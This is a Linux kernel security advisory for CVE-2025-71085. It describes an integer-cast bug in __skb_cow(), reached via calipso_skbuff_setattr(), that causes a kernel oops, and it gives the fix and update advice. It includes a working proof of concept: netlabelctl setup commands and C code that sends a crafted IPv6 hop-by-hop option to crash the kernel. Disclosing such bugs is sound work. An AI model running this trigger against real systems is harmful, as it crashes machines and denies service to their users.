Subject: CVE-2025-71085: ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()

Description
===========

In the Linux kernel, the following vulnerability has been resolved:

ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()

There exists a kernel oops caused by a BUG_ON(nhead < 0) at
net/core/skbuff.c:2232 in pskb_expand_head().
This bug is triggered as part of the calipso_skbuff_setattr()
routine when skb_cow() is passed headroom > INT_MAX
(i.e. (int)(skb_headroom(skb) + len_delta) < 0).

The root cause of the bug is due to an implicit integer cast in
__skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure
that delta = headroom - skb_headroom(skb) is never negative, otherwise
we will trigger a BUG_ON in pskb_expand_head(). However, if
headroom > INT_MAX and delta <= -NET_SKB_PAD, the check passes, delta
becomes negative, and pskb_expand_head() is passed a negative value for
nhead.

Fix the trigger condition in calipso_skbuff_setattr(). Avoid passing
"negative" headroom sizes to skb_cow() within calipso_skbuff_setattr()
by only using skb_cow() to grow headroom.

PoC:
	Using `netlabelctl` tool:

        netlabelctl map del default
        netlabelctl calipso add pass doi:7
        netlabelctl map add default address:0::1/128 protocol:calipso,7

        Then run the following PoC:

        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

        // setup msghdr
        int cmsg_size = 2;
        int cmsg_len = 0x60;
        struct msghdr msg;
        struct sockaddr_in6 dest_addr;
        struct cmsghdr * cmsg = (struct cmsghdr *) calloc(1,
                        sizeof(struct cmsghdr) + cmsg_len);
        msg.msg_name = &dest_addr;
        msg.msg_namelen = sizeof(dest_addr);
        msg.msg_iov = NULL;
        msg.msg_iovlen = 0;
        msg.msg_control = cmsg;
        msg.msg_controllen = cmsg_len;
        msg.msg_flags = 0;

        // setup sockaddr
        dest_addr.sin6_family = AF_INET6;
        dest_addr.sin6_port = htons(31337);
        dest_addr.sin6_flowinfo = htonl(31337);
        dest_addr.sin6_addr = in6addr_loopback;
        dest_addr.sin6_scope_id = 31337;

        // setup cmsghdr
        cmsg->cmsg_len = cmsg_len;
        cmsg->cmsg_level = IPPROTO_IPV6;
        cmsg->cmsg_type = IPV6_HOPOPTS;
        char * hop_hdr = (char *)cmsg + sizeof(struct cmsghdr);
        hop_hdr[1] = 0x9; //set hop size - (0x9 + 1) * 8 = 80

        sendmsg(fd, &msg, 0);

The Linux kernel CVE team has assigned CVE-2025-71085 to this issue.

Mitigation
==========

The Linux kernel CVE team recommends that you update to the latest
stable kernel version for this, and many other bugfixes.  Individual
changes are never tested alone, but rather are part of a larger kernel
release.  Cherry-picking individual commits is not recommended or
supported by the Linux kernel community at all.  If however, updating to
the latest release is impossible, the individual changes to resolve this
issue can be found at these commits:
